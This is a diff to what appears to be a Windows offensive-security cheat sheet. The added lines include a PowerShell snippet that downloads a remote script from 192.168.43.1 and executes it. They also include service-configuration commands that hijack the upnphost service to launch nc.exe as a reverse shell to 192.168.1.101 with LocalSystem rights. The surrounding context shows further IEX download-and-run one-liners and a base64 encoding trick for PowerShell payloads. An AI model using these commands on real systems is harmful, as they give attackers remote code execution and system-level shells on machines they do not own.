@@ -35,6 +35,9 @@ powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.
 
 powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/powershell_attack.txt')
 
+$scriptPath = ((new-object net.webclient).DownloadString('http://192.168.43.1/toto.ps1'))
+Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "coucou","tata"
+
 #Encoded command powershell
 
 cat shell3 | iconv --to-code UTF-16LE |   base64 -w 0
@@ -157,4 +160,14 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
     }
     return TRUE;
 }
+```
+
+#### Edit Service
+```
+sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+sc  start upnphost
+
+Get-Service upnphost | start-service
 ```
